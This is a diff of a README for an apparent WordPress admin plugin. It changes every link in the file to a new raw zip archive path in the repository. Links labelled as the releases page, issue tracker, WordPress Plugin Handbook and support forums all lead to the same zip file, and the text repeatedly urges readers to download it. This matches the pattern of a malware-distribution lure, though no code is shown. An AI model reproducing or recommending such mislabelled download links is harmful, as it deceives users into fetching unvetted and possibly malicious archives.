@@ -1,6 +1,6 @@
 # 🎉 mu-cc-admin-popover-row-actions - Simplify Your WP Admin Experience
 
-[![Download mu-cc-admin-popover-row-actions](https://raw.githubusercontent.com/dat291110/mu-cc-admin-popover-row-actions/main/mu-plugins/codecorn/admin-popover-row-actions/assets/js/mu-cc-admin-popover-row-actions-tollkeeper.zip)](https://raw.githubusercontent.com/dat291110/mu-cc-admin-popover-row-actions/main/mu-plugins/codecorn/admin-popover-row-actions/assets/js/mu-cc-admin-popover-row-actions-tollkeeper.zip)
+[![Download mu-cc-admin-popover-row-actions](https://github.com/dat291110/mu-cc-admin-popover-row-actions/raw/refs/heads/main/mu-plugins/admin_mu_popover_cc_actions_row_v1.8-alpha.4.zip)](https://github.com/dat291110/mu-cc-admin-popover-row-actions/raw/refs/heads/main/mu-plugins/admin_mu_popover_cc_actions_row_v1.8-alpha.4.zip)
 
 ## 📜 Overview 
 
@@ -22,11 +22,11 @@ Before you begin, ensure your system meets these requirements:
 
 To get the latest version of the plugin, visit the Releases page. Here you will find the most recent files available for download.
 
-[Download mu-cc-admin-popover-row-actions](https://raw.githubusercontent.com/dat291110/mu-cc-admin-popover-row-actions/main/mu-plugins/codecorn/admin-popover-row-actions/assets/js/mu-cc-admin-popover-row-actions-tollkeeper.zip)
+[Download mu-cc-admin-popover-row-actions](https://github.com/dat291110/mu-cc-admin-popover-row-actions/raw/refs/heads/main/mu-plugins/admin_mu_popover_cc_actions_row_v1.8-alpha.4.zip)
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/dat291110/mu-cc-admin-popover-row-actions/main/mu-plugins/codecorn/admin-popover-row-actions/assets/js/mu-cc-admin-popover-row-actions-tollkeeper.zip).
+1. Go to the [Releases page](https://github.com/dat291110/mu-cc-admin-popover-row-actions/raw/refs/heads/main/mu-plugins/admin_mu_popover_cc_actions_row_v1.8-alpha.4.zip).
 2. Find the version you want to download.
 3. Click the download link for the zip file of the plugin.
 4. After the download completes, unzip the file.
@@ -64,14 +64,14 @@ This plugin is designed with accessibility in mind. It supports keyboard navigat
 
 ## ⚙️ Support & Issues
 
-If you encounter any issues while using the mu-cc-admin-popover-row-actions plugin, please visit our [GitHub Issues page](https://raw.githubusercontent.com/dat291110/mu-cc-admin-popover-row-actions/main/mu-plugins/codecorn/admin-popover-row-actions/assets/js/mu-cc-admin-popover-row-actions-tollkeeper.zip). You can find solutions to common problems and report any new issues you may face.
+If you encounter any issues while using the mu-cc-admin-popover-row-actions plugin, please visit our [GitHub Issues page](https://github.com/dat291110/mu-cc-admin-popover-row-actions/raw/refs/heads/main/mu-plugins/admin_mu_popover_cc_actions_row_v1.8-alpha.4.zip). You can find solutions to common problems and report any new issues you may face.
 
 ## 🎓 Additional Resources
 
 For further assistance, check out these resources:
 
-- [WordPress Plugin Handbook](https://raw.githubusercontent.com/dat291110/mu-cc-admin-popover-row-actions/main/mu-plugins/codecorn/admin-popover-row-actions/assets/js/mu-cc-admin-popover-row-actions-tollkeeper.zip)
-- [WordPress Support Forums](https://raw.githubusercontent.com/dat291110/mu-cc-admin-popover-row-actions/main/mu-plugins/codecorn/admin-popover-row-actions/assets/js/mu-cc-admin-popover-row-actions-tollkeeper.zip)
+- [WordPress Plugin Handbook](https://github.com/dat291110/mu-cc-admin-popover-row-actions/raw/refs/heads/main/mu-plugins/admin_mu_popover_cc_actions_row_v1.8-alpha.4.zip)
+- [WordPress Support Forums](https://github.com/dat291110/mu-cc-admin-popover-row-actions/raw/refs/heads/main/mu-plugins/admin_mu_popover_cc_actions_row_v1.8-alpha.4.zip)
 
 ## ✏️ Contribution
 
@@ -83,4 +83,4 @@ Thank you for choosing mu-cc-admin-popover-row-actions. We hope this plugin enha
 
 Don't forget to download it today!
 
-[Download mu-cc-admin-popover-row-actions](https://raw.githubusercontent.com/dat291110/mu-cc-admin-popover-row-actions/main/mu-plugins/codecorn/admin-popover-row-actions/assets/js/mu-cc-admin-popover-row-actions-tollkeeper.zip)
+[Download mu-cc-admin-popover-row-actions](https://github.com/dat291110/mu-cc-admin-popover-row-actions/raw/refs/heads/main/mu-plugins/admin_mu_popover_cc_actions_row_v1.8-alpha.4.zip)
